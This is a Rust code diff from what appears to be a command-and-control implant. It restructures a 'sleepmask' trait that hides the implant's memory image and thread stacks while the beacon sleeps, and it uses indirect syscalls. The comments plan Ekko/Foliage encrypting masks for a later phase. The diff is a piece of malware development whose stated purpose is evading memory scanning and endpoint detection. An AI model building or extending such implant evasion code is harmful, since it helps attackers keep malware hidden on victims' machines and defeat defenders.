@@ -23,22 +23,28 @@
 /// behavior (plain indirect-syscall sleep, no masking); an encrypting kit
 /// (Ekko/Foliage) overrides it.
 pub trait SleepmaskKit {
-    /// Mask the implant image + thread stacks, sleep ~`seconds`, then FULLY
-    /// unmask before returning. Default: no masking — delegate to the
-    /// indirect-syscall sleep (byte-identical to the pre-kit beacon loop).
+    /// Own the sleep window: mask the implant image + thread stacks, sleep
+    /// ~`seconds`, then FULLY unmask before returning. An Ekko/Foliage impl's
+    /// APC timer IS the sleep (it does not call a plain sleep internally), so
+    /// the combined mask+sleep+unmask granularity is deliberate — do NOT split
+    /// it into separate mask()/unmask() around an external sleep.
     ///
     /// **Invariant a real impl MUST hold**: on return the implant image and
     /// every thread stack are byte-identical to entry. Returning with `.text`
     /// still encrypted (or a stack still XOR'd) crashes on the next instruction.
+    fn sleep_masked(&self, seconds: u32);
+}
+
+/// Default sleepmask kit: no masking. Delegates to the raw indirect-syscall
+/// sleep (`beacon::sleep_seconds`), so behavior is byte-identical to the
+/// pre-kit loop. The delegation lives in the impl (not a trait default) so the
+/// kit trait never depends back on the beacon module.
+pub struct NoMask;
+impl SleepmaskKit for NoMask {
     fn sleep_masked(&self, seconds: u32) {
         crate::beacon::sleep_seconds(seconds);
     }
 }
-
-/// Default sleepmask kit: no masking. Behavior is identical to the pre-kit
-/// loop (plain indirect `NtDelayExecution` via `beacon::sleep_seconds`).
-pub struct NoMask;
-impl SleepmaskKit for NoMask {}
 
 /// The active sleepmask kit. Swap `NoMask` for an encrypting impl (Ekko/Foliage)
 /// in P2; nothing else in the beacon loop changes.
